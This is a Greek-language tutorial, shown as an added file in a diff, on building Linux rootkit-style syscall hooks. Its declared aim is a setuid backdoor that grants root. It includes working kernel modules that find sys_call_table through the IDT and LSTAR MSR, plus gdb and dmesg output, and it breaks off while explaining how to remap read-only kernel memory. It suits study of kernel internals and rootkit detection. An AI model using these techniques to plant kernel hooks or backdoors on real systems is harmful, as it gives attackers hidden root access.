@@ -1,0 +1,1350 @@
+
+    Kernel Mode Hooking
+        - oblique 2010
+
+
+    0x01] Introduction
+    0x02] Kernel mode hooking basic theory
+    0x03] LKM - hello kernel
+    0x04] Interrupt Descriptor Table (IDT)
+    0x05] Get sys_call_table - Linux x86-32
+    0x06] Model-Specific Registers (MSRs)
+    0x07] Get sys_call_table - Linux x86-64
+    0x08] Get ia32_sys_call_table - Linux x86-64
+    0x09] Map to a writable memory
+    0x0A] Hook a system call
+    0x0B] Other ideas/methods
+    0x0C] Greets
+    0x0D] References
+
+
+
+--[ 0x01 Introduction
+
+    Σε αυτό το άρθρο θα δείξω την κυριότερη τεχνική που χρησιμοποιούν τα
+    rootkits, με την οποια μπορούμε να κάνουμε hook system calls σε kernel
+    mode. Στο άρθρο θα ασχοληθώ μόνο με το Linux 2.6 x86-32 και Linux 2.6
+    x86-64. Το τελικό αποτέλεσμα είναι να κάνουμε hook το system call
+    setuid το οποιο όταν παίρνει ένα "μαγικό" uid σαν argument θα δίνει
+    root στο process.
+
+
+--[ 0x02 Kernel mode hooking basic theory
+
+    Τα μοντέρνα OS που δουλεύουν σε x86 architecture χρησιμοποιούνε το
+    λεγόμενο protected mode. Στο protected mode υπάρχουν 4 διαφορετικά
+    privilege levels, 0 μέχρι 3 ή αλλιώς ring0 μέχρι ring3. Το πιο
+    high-level (least privileges) είναι το userland (ring3) και το πιο
+    low-level (highest privileges) είναι το kernel mode (ring0). Τα
+    applications τρέχουν στο userland και με κάποιο interrupt λένε στον
+    kernel τι system call να τρέξει. Αυτό το interrupt στο Linux x86-32
+    είναι το instruction "int $0x80" και στο Linux x86-64 το instruction
+    "syscall". Όταν πάρει το interrupt το CPU τότε γίνετε switch το
+    privilege level από ring3 σε ring0 και τρέχει το system_call. Ας δούμε
+    τον κώδικα του για το x86-32:
+
+
+    "arch/x86/kernel/entry_32.S" from [5]
+
+    ...
+    ...
+
+    ENTRY(system_call)
+	RING0_INT_FRAME
+	pushl %eax
+	CFI_ADJUST_CFA_OFFSET 4
+	SAVE_ALL
+	GET_THREAD_INFO(%ebp)
+	testl $_TIF_WORK_SYSCALL_ENTRY,TI_flags(%ebp)
+	jnz syscall_trace_entry
+	cmpl $(nr_syscalls), %eax
+	jae syscall_badsys
+    syscall_call:
+	call *sys_call_table(,%eax,4)
+	movl %eax,PT_EAX(%esp)
+    syscall_exit:
+	LOCKDEP_SYS_EXIT
+	DISABLE_INTERRUPTS(CLBR_ANY)
+	TRACE_IRQS_OFF
+	movl TI_flags(%ebp), %ecx
+	testl $_TIF_ALLWORK_MASK, %ecx
+	jne syscall_exit_work
+
+    ...
+    ...
+
+    όπως βλέπετε εδώ το "call *sys_call_table(,%eax,4)" κάνει call από ένα
+    pointer array (sys_call_table) το system call με βάση τον αριθμό που
+    υπάρχει στον EAX. Οι αριθμοί των system calls υπάρχουν στο
+    /usr/include/asm/unistd_32.h για x86-32 και
+    /usr/include/asm/unistd_64.h για x86-64.
+
+    Το ίδιο συμβαίνει και στο x86-64 όμως εκεί υπάρχει και το array
+    ia32_sys_call_table το οποιο καλείται από το ia32_syscall και αυτό
+    υπάρχει για να μπορεί ο kernel τρέξει 32bit binaries.
+
+    Για να κάνουμε hook ένα system call πρέπει να αλλάξουμε το pointer του
+    από το sys_call_table με ένα pointer κάποιου δικού μας function που θα
+    κάνει αυτό που θέλουμε και μετά θα καλεί το αληθινό pointer του system
+    call (αν χρειαστεί). Αυτό δεν μπορεί να γίνει από κάποιο πρόγραμμα που
+    θα δουλεύει σε userland επειδή δεν έχει access στο memory του kernel
+    (βασικά μπορεί να έχει μέσο του /dev/mem και /dev/kmem), έτσι θα
+    χρησιμοποιήσουμε Loadable Kernel Module (LKM). Αρκετοί το LKM το
+    συνάντησαν σαν driver που μέσω shell τον έκαναν load με τα commands
+    modprobe ή insmod. Στην ουσία το LKM είναι ένα module που γίνετε load
+    στο kernel memory και πλέον είναι κομμάτι του kernel.
+
+    Στον 2.4 kernel το hooking γίνετε παρα πολύ εύκολα επειδή το
+    sys_call_table είναι exported έτσι με το "extern void *sys_call_table[];"
+    μπορούμε να το πάρουμε και μπορούμε να γράψουμε σε αυτό. Σε αντίθεση
+    στον 2.6 kernel δεν είναι exported το sys_call_table και είναι
+    read-only από τον 2.6.16-rc1 και μετά. Υπάρχουν λύσεις και για τα 2
+    προβλήματα, επίσης υπάρχουν 2 τρόποι να πάρουμε το address
+    sys_call_table που θα τους δούμε πιο κάτω.
+
+
+--[ 0x03 LKM - hello kernel
+
+    Πριν προχωρήσω θα δείξω σε αυτό το section πως κάνουμε compile ένα LKM.
+    Ένα LKM δεν έχει main() αλλά έχει άλλα 2 functions. Το init_module() το
+    οποιο καλείται μόλις γίνει load και το cleanup_module() το οποιο
+    καλείται μόλις γίνει unload. Το init_module() επιστρέφει int, αν είναι
+    αρνητικό τότε το module δεν γίνετε load και επιστρέφει error και αν
+    είναι 0 τότε σημαίνει το module έγινε load σωστά. Όσες functions δεν
+    περνούν arguments τότε πρέπει να βάζουμε void στο μέρος τον arguments λόγο
+    κάποιον standards στο programming style. Ακόμη ένα standard είναι ότι
+    πρέπει με το macro MODULE_LICENSE() να δηλώσουμε το license του module
+    (more info: http://kerneltrap.org/node/2991 ).
+
+
+--file: hello_kernel.c--
+#include <linux/module.h>
+
+int init_module(void) {
+    printk(KERN_INFO "Hello kernel!");
+    return 0;
+}
+
+void cleanup_module(void) {
+    printk(KERN_INFO "Bye bye kernel!");
+}
+
+MODULE_LICENSE("GPL");
+--EOF--
+    
+    
+    Στον 2.6 kernel υπάρχει ακόμη ένας τρόπος να δηλώσουμε το function που
+    θα κάνει init και το function που θα κάνει cleanup με ότι όνομα θέλουμε.
+
+    Δήλωση του function που κάνει init:
+
+    static int __init name_1(void) {
+    }
+
+
+    Δήλωση του function που κάνει cleanup:
+
+    static void __exit name_2(void) {
+    }
+
+
+    και μετά βάζουμε:
+
+    module_init(name_1);
+    module_exit(name_2);
+
+
+    Ένα δεύτερο παράδειγμα του hello_kernel.c:
+
+
+--file: hello_kernel.c--
+#include <linux/module.h>
+
+static int __init hello_init(void) {
+    printk(KERN_INFO "Hello kernel!");
+    return 0;
+}
+
+static void __exit hello_exit(void) {
+    printk(KERN_INFO "Bye bye kernel!");
+}
+
+module_init(hello_init);
+module_exit(hello_exit);
+MODULE_LICENSE("GPL");
+--EOF--
+
+
+    Για να τυπώνει μηνύματα ο kernel χρησιμοποιεί το printk() το οποιο έχει
+    παρόμοιο syntax με το printf() μονο που στην αρχή του δηλώνουμε τι
+    είδος μήνυμα θα τυπώσει. Τα είδη είναι τα εξής: KERN_EMERG, KERN_ALERT,
+    KERN_CRIT, KERN_ERR, KERN_WARNING, KERN_NOTICE, KERN_INFO, KERN_DEBUG,
+    KERN_DEFAULT, KERN_CONT.  Για να δούμε τα μηνύματα του kernel μπορούμε
+    να τρέξουμε την εντολή 'dmesg' (more info: 'man dmesg').
+
+    Για να κάνουμε compile ένα module στον 2.6 kernel πρέπει να φτιάξουμε
+    ένα Makefile που θα περιέχει το variable obj-m στο οποιο βάζουμε τα
+    ονόματα τον modules αλλα με .ο στο τέλος. Δηλαδή στην περίπτωση μας
+    είναι hello_kernel.o
+
+
+--file: Makefile--
+obj-m = hello_kernel.o
+KDIR = /lib/modules/$(shell uname -r)/build
+
+all:
+    make -C $(KDIR) M=$(PWD) modules
+clean:
+    make -C $(KDIR) M=$(PWD) clean
+--EOF-- 
+    
+    (more info: "Documentation/kbuild/modules.txt" from [5])
+
+    -- NOTE --
+    Μην ξεχνάτε ότι το basic syntax του Makefile είναι:
+
+    <target>: [ <dependency > ]*
+       [ <TAB> <command> <endl> ]+
+
+    Έτσι στην 5η και 7η γραμμή πρέπει να υπάρχει tab και όχι spaces πριν το
+    make. Αν τρέξετε 'make' και σας βγάλει κάποιο error τότε ελέγξετε αν
+    υπάρχουν τα tabs.
+    -- END OF NOTE --
+
+
+    Μετά την δημιουργία του Makefile απλά τρέχουμε 'make' και θα κάνει
+    compile το module. Μετά τρέχουμε σαν root 'insmod hello_kernel.ko' για
+    load και 'rmmod hello_kernel' για unload.
+
+
+    oblique@gentoo ~/hello_kernel $ ls
+    hello_kernel.c  Makefile
+    oblique@gentoo ~/hello_kernel $ make
+    make -C /lib/modules/2.6.34-zen1/build M=/home/oblique/hello_kernel modules
+    make[1]: Entering directory `/usr/src/linux-2.6.34-zen1-r2'
+      CC [M]  /home/oblique/hello_kernel/hello_kernel.o
+      Building modules, stage 2.
+      MODPOST 1 modules
+      CC      /home/oblique/hello_kernel/hello_kernel.mod.o
+      LD [M]  /home/oblique/hello_kernel/hello_kernel.ko
+    make[1]: Leaving directory `/usr/src/linux-2.6.34-zen1-r2'
+    oblique@gentoo ~/hello_kernel $ sudo insmod hello_kernel.ko
+    oblique@gentoo ~/hello_kernel $ dmesg
+    ...
+    ...
+    [60947.072113] Hello kernel!
+    oblique@gentoo ~/hello_kernel $ sudo rmmod hello_kernel
+    oblique@gentoo ~/hello_kernel $ dmesg
+    ...
+    ...
+    [60947.072113] Hello kernel!
+    [61105.613280] Bye bye kernel!
+    oblique@gentoo ~/hello_kernel $
+
+
+--[ 0x04 Interrupt Descriptor Table (IDT)
+
+    Το IDT είναι ένα table του x86 architecture το οποίο μπορεί να έχει
+    μέχρι 256 καταχωρίσεις για 3 ειδών gates (task gate, interrupt gate,
+    trap gate). Το "int $0x80" ανήκει στο interrupt gate. Αυτό το table
+    υπάρχει στο memory του kernel και ο kernel κάνει load το address του
+    στον IDT Register (IDTR) με το instruction LIDT. Αυτόν τον register
+    μπορούμε να τον διαβάσουμε με το instruction SIDT που παίρνει σαν
+    destination operand ένα memory address. Ο IDTR χωρίζεται ως έχει:
+
+    x86-32:
+
+    BYTES   NAMES
+    2       limit
+    4       base
+
+
+    x86-64:
+    
+    BYTES   NAMES
+    2       limit
+    8       base
+
+
+    Το base είναι το address που αρχίζει το IDT και αν προσθέσουμε το limit
+    παίρνουμε το τέλος του table. Τον IDTR μπορούμε να τον εκφράσουμε στην
+    C με το εξής struct:
+
+
+    struct idtr {
+        unsigned short limit;
+        void *base;
+    } __attribute__ ((packed));
+
+
+    -- NOTE --
+    Με το "__attribute__ ((packed))" λέμε στον gcc ότι πρέπει να
+    χρησιμοποιήσει το minimun απαιτούμενο memory που χρειάζεται το type. Με
+    αλλα λόγια εδώ φτιάχνει ένα struct που είναι ακριβώς τα bytes που
+    θέλουμε.
+    -- END OF NOTE --
+
+    
+    Το IDT τώρα ξέρουμε ότι βρίσκετε στο base και ότι περιέχει 3 είδη
+    gates.  Το descriptor του IDT χωρίζεται ως έχει:
+
+
+    x86-32:
+
+    BYTES   NAMES
+    2       offset low bits (0..15)
+    2       segment selector
+    1       zero
+    1       type & flags
+    2       offset high bits (16..31)
+
+    
+    struct idt_descriptor {
+        unsigned short offset_low;
+        unsigned short selector;
+        unsigned char zero;
+        unsigned char type_flags;
+        unsigned short offset_high;
+    } __attribute__ ((packed));
+
+
+    Στο type_flags υπάρχει το type του gate και διαφορα flags. Εμείς θα
+    χρειαστούμε το offset_low και το offset_high. Για να πάρουμε το offset
+    κάνουμε:
+
+    offset = (offset_high<<16) | offset_low
+
+
+    x86-64:
+
+    BYTES   NAMES
+    2       offset low bits (0..15)
+    2       segment selector
+    1       zero
+    1       type & flags
+    2       offset middle bits (16..31)
+    4       offset high bits (32..63)
+    4       zero
+
+    struct idt_descriptor {
+        unsigned short offset_low;
+        unsigned short selector;
+        unsigned char zero1;
+        unsigned char type_flags;
+        unsigned short offset_middle;
+        unsigned int offset_high;
+        unsigned int zero2;
+    } __attribute__ ((packed));
+
+
+    Εδώ θα χρειαστούμε το offset_low, offset_middle kai to offset_high. Για
+    να πάρουμε το offset κάνουμε:
+
+    offset = (offset_high<<32) | (offset_middle<<16) | offset_low
+
+
+--[ 0x05 Get sys_call_table - Linux x86-32
+
+    Για να πάρουμε το sys_call_table υπάρχουν 2 μέθοδοι: 1) μέσω κάποιον
+    files (/boot/System.map-(kernel_version), vmlinux, /proc/kallsyms) τα
+    οποία μπορεί να μην υπάρχουν.  2) μέσω του IDT descriptor του interrupt
+    0x80.
+
+
+    Μέθοδος 1:
+
+    oblique@gentoo ~ $ grep sys_call_table /boot/System.map-`uname -r`
+    c1582160 R sys_call_table
+    oblique@gentoo ~ $ nm /usr/src/linux/vmlinux | grep sys_call_table
+    c1582160 R sys_call_table
+    oblique@gentoo ~ $ grep sys_call_table /proc/kallsyms 
+    oblique@gentoo ~ $ grep system_call /proc/kallsyms 
+    c157fac4 T system_call
+
+    -- NOTE --
+    Το /usr/src/linux είναι το path του source του kernel σας. Επίσης τα
+    addresses είναι διαφορετικά σε κάθε σύστημα.
+    -- END OF NOTE --
+
+
+    Όπως βλέπουμε στα πρώτα 2 πήραμε ακριβώς το address όμως στο
+    /proc/kallsyms δεν υπάρχει, αλλα υπάρχει το system_call. Ας δούμε στον
+    gdb το system_call.
+
+
+    oblique@gentoo ~ $ gdb -q /usr/src/linux/vmlinux
+    Reading symbols from /usr/src/linux-2.6.34-zen1-r2/vmlinux...done.
+    (gdb) x/30i 0xc157fac4
+    0xc157fac4:     push   %eax
+    0xc157fac5:     cld    
+    0xc157fac6:     push   $0x0
+    0xc157fac8:     push   %fs
+    0xc157faca:     push   %es
+    0xc157facb:     push   %ds
+    0xc157facc:     push   %eax
+    0xc157facd:     push   %ebp
+    0xc157face:     push   %edi
+    0xc157facf:     push   %esi
+    0xc157fad0:     push   %edx
+    0xc157fad1:     push   %ecx
+    0xc157fad2:     push   %ebx
+    0xc157fad3:     mov    $0x7b,%edx
+    0xc157fad8:     mov    %edx,%ds
+    0xc157fada:     mov    %edx,%es
+    0xc157fadc:     mov    $0xd8,%edx
+    0xc157fae1:     mov    %edx,%fs
+    0xc157fae3:     mov    $0xffffe000,%ebp
+    0xc157fae8:     and    %esp,%ebp
+    0xc157faea:     testl  $0x100001d1,0x8(%ebp)
+    0xc157faf1:     jne    0xc157fbd8
+    0xc157faf7:     cmp    $0x152,%eax
+    0xc157fafc:     jae    0xc157fc21
+    0xc157fb02:     call   *-0x3ea7dea0(,%eax,4)
+    0xc157fb09:     mov    %eax,0x18(%esp)
+    0xc157fb0d:     cli    
+    0xc157fb0e:     mov    0x8(%ebp),%ecx
+    0xc157fb11:     test   $0x1000feff,%ecx
+    0xc157fb17:     jne    0xc157fbf8
+
+
+    Εδώ βλέπουμε 30 instructions από το address του system_call
+    (0xc157fac4). Όπως είχα δείξει πιο πάνω στο system_call υπάρχει ένα
+    call που καλεί το system call από το sys_call_table. Αυτό το call
+    βρίσκετε στο address 0xc157fb02 και το επόμενο instruction βρίσκετε στο
+    0xc157fb09. Άρα 0xc157fb09 - 0xc157fb02 = 7 bytes.
+
+
+    (gdb) x/7xb 0xc157fb02
+    0xc157fb02:     0xff    0x14    0x85    0x60    0x21    0x58    0xc1
+
+
+    Τα πρώτα 3 bytes είναι τα opcodes του instruction και μετά ακολουθεί το
+    address του sys_call_table
+
+
+    (gdb) x/xw 0xc157fb02 + 3
+    0xc157fb05:     0xc1582160
+    
+
+    Όπως βλέπετε εδώ βρήκαμε το address του sys_call_table. Δεν θα υλοποιήσω
+    αυτή την μέθοδο επειδή προσωπικά προτιμάω την δεύτερη.
+
+
+    Μέθοδος 2:
+
+    Όπως είχαμε δει πιο πάνω τα interrupts δηλώνονται στο IDT.  Όταν
+    καλέσουμε το instruction "int $0x80" τότε ο CPU πηγαίνει στο IDT και
+    παίρνει το IDT descriptor του interrupt 0x80 και μετά κάνει jump στο
+    offset, το offset αυτό είναι το address του system_call. Από εκεί
+    μπορούμε να κάνουμε search για το pattern 0xff 0x14 0x85 και όταν το
+    βρούμε τα επόμενα 4 bytes είναι το address του sys_call_table.
+
+
+--file: get_sct.c--
+#include <linux/module.h>
+
+struct idt_descriptor {
+    unsigned short offset_low;
+    unsigned short selector;
+    unsigned char zero;
+    unsigned char type_flags;
+    unsigned short offset_high;
+} __attribute__ ((packed));
+
+struct idtr {
+    unsigned short limit;
+    void *base;
+} __attribute__ ((packed));
+
+
+void *get_sys_call_table(void) {
+    struct idtr idtr;
+    struct idt_descriptor idtd;
+    void *system_call;
+    unsigned char *ptr;
+    int i;
+
+    asm volatile("sidt %0" : "=m"(idtr));
+
+    memcpy(&idtd, idtr.base + 0x80*sizeof(idtd), sizeof(idtd));
+
+    system_call = (void*)((idtd.offset_high<<16) | idtd.offset_low);
+
+    printk(KERN_INFO "system_call: 0x%p", system_call);
+
+    for (ptr=system_call, i=0; i<500; i++) {
+        if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0x85)
+            return *((void**)(ptr+3));
+        ptr++;
+    }
+
+    return NULL;
+}
+
+static int __init sct_init(void) {
+    printk(KERN_INFO "sys_call_table: 0x%p", get_sys_call_table());
+    return 0;
+}
+
+static void __exit sct_exit(void) {
+}
+
+module_init(sct_init);
+module_exit(sct_exit);
+MODULE_LICENSE("GPL");
+--EOF--
+
+
+    Επεξήγηση:
+
+    asm volatile("sidt %0" : "=m"(idtr));
+    memcpy(&idtd, idtr.base + 0x80*sizeof(idtd), sizeof(idtd));
+
+    Εδώ παίρνουμε τον IDTR και όταν κάνουμε base + 0x80*sizeof(idtd) τότε
+    βρισκόμαστε στο IDT descriptor του interrupt 0x80.
+
+
+    system_call = (void*)((idtd.offset_high<<16) | idtd.offset_low);
+    for (ptr=system_call, i=0; i<500; i++) {
+        if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0x85)
+            return *((void**)(ptr+3));
+        ptr++;
+    }
+
+    Εδώ φτιάχνουμε το address του system_call και μετά με loop ψάχνουμε το
+    pattern, του προσθέτουμε 3 και κάνουμε return τι κρατάει το address που
+    βρήκαμε.
+
+
+    oblique@gentoo ~/hooking $ make
+    make -C /lib/modules/2.6.34-zen1/build M=/home/oblique/hooking modules
+    make[1]: Entering directory `/usr/src/linux-2.6.34-zen1-r2'
+      CC [M]  /home/oblique/hooking/get_sct.o
+      Building modules, stage 2.
+      MODPOST 1 modules
+      CC      /home/oblique/hooking/get_sct.mod.o
+      LD [M]  /home/oblique/hooking/get_sct.ko
+    make[1]: Leaving directory `/usr/src/linux-2.6.34-zen1-r2'
+    oblique@gentoo ~/hooking $ sudo insmod get_sct.ko 
+    oblique@gentoo ~/hooking $ dmesg | tail
+    ...
+    ...
+    [70274.087185] system_call: 0xc157fac4
+    [70274.087190] sys_call_table: 0xc1582160
+    oblique@gentoo ~/hooking $ sudo rmmod get_sct
+
+
+--[ 0x06 Model-Specific Registers (MSRs)
+
+    Οι MSRs είναι registers που χρησιμοποιούνται για παρα πολύ συγκεκριμένα
+    πράγματα ανάλογα με το CPU. Στους MSRs μπορούμε να γράψουμε με το
+    instruction WRMSR και να διαβάσουμε με το instruction RDMSR. Αυτά τα 2
+    instructions χρησιμοποιούνε 3 registers: EDX, EAX, ECX. Στον ECX
+    βάζουμε το value του MSR που θέλουμε να χρησιμοποιήσουμε. Οι MSRs είναι
+    64bit registers, το EDX το χρησιμοποιούμε για τα high bits και το EAX
+    για τα low bits. Τα values που βάζουμε στον ECX μπορούμε να τα βρούμε
+    από το [8].
+
+
+--[ 0x07 Get sys_call_table - Linux x86-64
+
+    Το instruction SYSCALL που χρησιμοποιείτε για να καλέσει system calls το
+    x86-64 χρησιμοποιεί το IA32_LSTAR MSR. Σύμφωνα με το [8] το value του
+    IA32_LSTAR είναι 0xc0000082. Το IA32_LSTAR MSR συγκεκριμένα κρατάει το
+    address του system_call.
+
+
+    "arch/x86/kernel/entry_64.S" from [5]
+
+    ...
+    ...
+
+    ENTRY(system_call)
+            CFI_STARTPROC   simple
+            CFI_SIGNAL_FRAME
+            CFI_DEF_CFA     rsp,KERNEL_STACK_OFFSET
+            CFI_REGISTER    rip,rcx
+            SWAPGS_UNSAFE_STACK
+    ENTRY(system_call_after_swapgs)
+            movq    %rsp,PER_CPU_VAR(old_rsp)
+            movq    PER_CPU_VAR(kernel_stack),%rsp
+            ENABLE_INTERRUPTS(CLBR_NONE)
+            SAVE_ARGS 8,1
+            movq  %rax,ORIG_RAX-ARGOFFSET(%rsp)
+            movq  %rcx,RIP-ARGOFFSET(%rsp)
+            CFI_REL_OFFSET rip,RIP-ARGOFFSET
+            GET_THREAD_INFO(%rcx)
+            testl $_TIF_WORK_SYSCALL_ENTRY,TI_flags(%rcx)
+            jnz tracesys
+    system_call_fastpath:
+            cmpq $__NR_syscall_max,%rax
+            ja badsys
+            movq %r10,%rcx
+            call *sys_call_table(,%rax,8)
+            movq %rax,RAX-ARGOFFSET(%rsp)
+    ret_from_sys_call:
+
+    ...
+    ...
+
+
+    To "call *sys_call_table(,%rax,8)" καλεί το system call. Ας το δούμε το
+    system_call στον gdb.
+
+
+    oblique@sandbox64:~$ grep sys_call_table /boot/System.map-`uname -r`
+    ffffffff81544380 R sys_call_table
+    ffffffff8154dff8 r ia32_sys_call_table
+    oblique@sandbox64:~$ grep system_call /boot/System.map-`uname -r`
+    ffffffff81012060 T system_call
+    ffffffff81012070 T system_call_after_swapgs
+    ffffffff810120dc t system_call_fastpath
+    oblique@sandbox64:~$ gdb -q /usr/src/linux/vmlinux
+    Reading symbols from /usr/src/linux-2.6.32/vmlinux...done.
+    (gdb) x/30i 0xffffffff81012060
+    0xffffffff81012060:  swapgs 
+    0xffffffff81012063:  data32 data32 data32 nopw %cs:0x0(%rax,%rax,1)
+    0xffffffff81012070:  mov    %rsp,%gs:0xc6c8
+    0xffffffff81012079:  mov    %gs:0xcbc8,%rsp
+    0xffffffff81012082:  push   %rax
+    0xffffffff81012083:  callq  *0x790a0f(%rip)        # 0xffffffff817a2a98
+    0xffffffff81012089:  pop    %rax
+    0xffffffff8101208a:  sub    $0x50,%rsp
+    0xffffffff8101208e:  mov    %rdi,0x40(%rsp)
+    0xffffffff81012093:  mov    %rsi,0x38(%rsp)
+    0xffffffff81012098:  mov    %rdx,0x30(%rsp)
+    0xffffffff8101209d:  mov    %rax,0x20(%rsp)
+    0xffffffff810120a2:  mov    %r8,0x18(%rsp)
+    0xffffffff810120a7:  mov    %r9,0x10(%rsp)
+    0xffffffff810120ac:  mov    %r10,0x8(%rsp)
+    0xffffffff810120b1:  mov    %r11,(%rsp)
+    0xffffffff810120b5:  mov    %rax,0x48(%rsp)
+    0xffffffff810120ba:  mov    %rcx,0x50(%rsp)
+    0xffffffff810120bf:  mov    %gs:0xcbc8,%rcx
+    0xffffffff810120c8:  sub    $0x1fd8,%rcx
+    0xffffffff810120cf:  testl  $0x100001d1,0x10(%rcx)
+    0xffffffff810120d6:  jne    0xffffffff8101222c
+    0xffffffff810120dc:  cmp    $0x12a,%rax
+    0xffffffff810120e2:  ja     0xffffffff810121b6
+    0xffffffff810120e8:  mov    %r10,%rcx
+    0xffffffff810120eb:  callq  *-0x7eabbc80(,%rax,8)
+    0xffffffff810120f2:  mov    %rax,0x20(%rsp)
+    0xffffffff810120f7:  mov    $0x1000feff,%edi
+    0xffffffff810120fc:  mov    %gs:0xcbc8,%rcx
+    0xffffffff81012105:  sub    $0x1fd8,%rcx
+
+    
+    Το instruction που γυρεύουμε είναι στο 0xffffffff810120eb και είναι 7
+    bytes.
+
+
+    (gdb) x/7xb 0xffffffff810120eb
+    0xffffffff810120eb:     0xff    0x14    0xc5    0x80    0x43    0x54    0x81
+    (gdb) x/xw 0xffffffff810120eb + 3
+    0xffffffff810120ee:     0x81544380
+
+
+    Όπως βλέπετε πήραμε το sys_call_table μονο που θέλει σαν high bits το
+    0xffffffff. Επίσης το pattern δεν είναι το ίδιο με του x86-32, εδώ το
+    pattern που θα ψάχνουμε είναι 0xff 0x14 0xc5.
+   
+
+--file: get_sct64.c--
+#include <linux/module.h>
+
+#define IA32_LSTAR  0xc0000082
+
+void *get_sys_call_table(void) {
+    void *system_call;
+    unsigned char *ptr;
+    int i, low, high;
+
+    asm volatile("rdmsr" : "=a" (low), "=d" (high) : "c" (IA32_LSTAR));
+
+    system_call = (void*)(((long)high<<32) | low);
+
+    printk(KERN_INFO "system_call: 0x%p", system_call);
+
+    for (ptr=system_call, i=0; i<500; i++) {
+        if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0xc5)
+            return (void*)(0xffffffff00000000 | *((unsigned int*)(ptr+3)));
+        ptr++;
+    }
+
+    return NULL;
+}
+
+static int __init sct_init(void) {
+    printk(KERN_INFO "sys_call_table: 0x%p", get_sys_call_table());
+    return 0;
+}
+
+static void __exit sct_exit(void) {
+}
+
+module_init(sct_init);
+module_exit(sct_exit);
+MODULE_LICENSE("GPL");
+--EOF--
+    
+
+    oblique@sandbox64:~/hooking$ sudo insmod get_sct641.ko 
+    oblique@sandbox64:~/hooking$ dmesg | tail
+    ...
+    ...
+    [ 3027.560110] system_call: 0xffffffff81012060
+    [ 3027.560110] sys_call_table: 0xffffffff81544380
+    oblique@sandbox64:~/hooking$ sudo rmmod get_sct641
+
+
+--[ 0x08 Get ia32_sys_call_table - Linux x86-64
+
+    Τα x86-32 binaries όπως ξέρουμε καλούν το interrupt 0x80 για τα system
+    calls, έτσι για να μπορεί ο kernel να τρέξει x86-32 binaries έφτιαξαν
+    το ia32_syscall, το οποιο καλεί τα system calls από το
+    ia32_sys_call_table.  Όπως μάθαμε τα interrupts δηλώνονται στο IDT,
+    έτσι ήδη ξέρουμε την τεχνική για να πάρουμε το ia32_sys_call_table. Το
+    ia32_syscall καλεί το system call με αυτό το instruction
+    "call *ia32_sys_call_table(,%rax,8)" και το pattern που θα ψάχνουμε
+    είναι 0xff 0x14 0xc5.
+
+
+--file: get_ia32_sct64.c--
+#include <linux/module.h>
+
+struct idt_descriptor {
+    unsigned short offset_low;
+    unsigned short selector;
+    unsigned char zero1;
+    unsigned char type_flags;
+    unsigned short offset_middle;
+    unsigned int offset_high;
+    unsigned int zero2;
+} __attribute__ ((packed));
+
+struct idtr {
+    unsigned short limit;
+    void *base;
+} __attribute__ ((packed));
+
+
+void *get_ia32_sys_call_table(void) {
+    struct idtr idtr;
+    struct idt_descriptor idtd;
+    void *ia32_syscall;
+    unsigned char *ptr;
+    int i;
+
+    asm volatile("sidt %0" : "=m"(idtr));
+
+    memcpy(&idtd, idtr.base + 0x80*sizeof(idtd), sizeof(idtd));
+
+    ia32_syscall = (void*)(((long)idtd.offset_high<<32) |
+                (idtd.offset_middle<<16) | idtd.offset_low);
+
+    printk(KERN_INFO "ia32_syscall: 0x%p", ia32_syscall);
+
+    for (ptr=ia32_syscall, i=0; i<500; i++) {
+        if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0xc5)
+            return (void*) (0xffffffff00000000 | *((unsigned int*)(ptr+3)));
+        ptr++;
+    }
+
+    return NULL;
+}
+
+static int __init sct_init(void) {
+    printk(KERN_INFO "ia32_sys_call_table: 0x%p", get_ia32_sys_call_table());
+    return 0;
+}
+
+static void __exit sct_exit(void) {
+}
+
+module_init(sct_init);
+module_exit(sct_exit);
+MODULE_LICENSE("GPL");
+--EOF--
+
+    oblique@sandbox64:~/hooking$ grep ia32_syscall /boot/System.map-`uname -r`
+    ffffffff810464e0 T ia32_syscall
+    ffffffff8154ea80 r ia32_syscall_end
+    oblique@sandbox64:~/hooking$ grep ia32_sys_call_table /boot/System.map-`uname -r`
+    ffffffff8154dff8 r ia32_sys_call_table
+    oblique@sandbox64:~/hooking$ sudo insmod get_ia32_sct64.ko 
+    oblique@sandbox64:~/hooking$ dmesg | tail
+    ...
+    ...
+    [ 5786.380128] ia32_syscall: 0xffffffff810464e0
+    [ 5786.380128] ia32_sys_call_table: 0xffffffff8154dff8
+    oblique@sandbox64:~/hooking$ sudo rmmod get_ia32_sct64
+
+
+--[ 0x09 Map to a writable memory
+
+    Όπως είχα πει στο 0x02 το sys_call_table είναι read-only, αυτό ισχύει και
+    για αλλα μέρη του kernel memory. Η λύση είναι να χρησιμοποιήσουμε το
+    vmap().
+
+    void *vmap(struct page **pages, unsigned int count,
+                                unsigned long flags, pgprot_t prot);
+
+    Το vmap όπως βλέπουμε παίρνει 4 arguments. Το 1ο παίρνει ένα array από
+    pointers που βλέπουν σε κάποια 'struct page', το 2ο είναι ο αριθμός τον
+    pages, το 3ο είναι κάποια flags και το 4ο είναι τι protections θα υπάρχουν
+    στο memory.
+
+    Το virtual memory χωρίζεται στα λεγόμενα pages, το size ενός page είναι
+    4096 bytes και μπορούμε να το πάρουμε με το PAGE_SIZE. Αν βρισκόμαστε
+    στην αρχή ενός page τότε το page address θα έχει 0 στα 0..12 bits.  Αν
+    δεν βρισκόμαστε στην αρχή τότε μπορούμε να πάρουμε το αρχικό address αν
+    κάνουμε bitwise add το PAGE_MASK. Για να μετατρέψουμε ένα virtual
+    address σε page address χρησιμοποιούμε το macro virt_to_page().  Ένα
+    virtual address ανήκει στο ίδιο page με ένα άλλο virtual address αν
+    διαφέρουν μονο στα 0..12 bits.
+
+    Με βάση το [6] το virt_to_page() ήτανε broken στο x86-64 σε κάποια
+    versions του kernel και διορθώθηκε στο version 2.6.22. Σε αυτή την
+    περίπτωση θα χρησιμοποιήσουμε το "pfn_to_page(__pa_symbol(addr) >>
+    PAGE_SHIFT);" στο addr θα είναι το variable με το address μας. Εδώ θα
+    χρειαστούμε κάποια preprocessors. Αν είναι defined το __i386__ σημαίνει
+    το compilation γίνετε σε x86-32 ενώ αν είναι defined το __x86_64__
+    γίνετε σε x86-64. Στο LINUX_VERSION_CODE υπάρχει το version του kernel
+    σε αριθμό και με το macro KERNEL_VERSION() μπορούμε να πάρουμε τον
+    αριθμό κάποιου version που ζητάμε, εδώ θα χρειαστούμε να κάνουμε
+    include το lixux/version.h.
+
